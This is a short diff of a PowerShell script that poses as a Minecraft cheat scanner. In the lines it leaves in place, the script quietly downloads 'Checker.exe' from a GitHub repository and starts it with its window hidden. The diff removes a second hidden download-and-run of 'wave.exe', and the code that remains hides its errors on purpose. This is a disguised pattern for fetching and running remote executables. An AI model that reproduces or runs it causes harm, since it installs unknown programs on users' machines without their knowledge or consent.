@@ -5,10 +5,7 @@ Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/C
     # Запускаем 
     Start-Process -FilePath "Checker.exe" -WindowStyle Hidden
 
-    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/releases/download/file/wave.exe" -OutFile "wave.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "wave.exe" -WindowStyle Hidden
+
 
 
 Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
@@ -100,6 +97,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
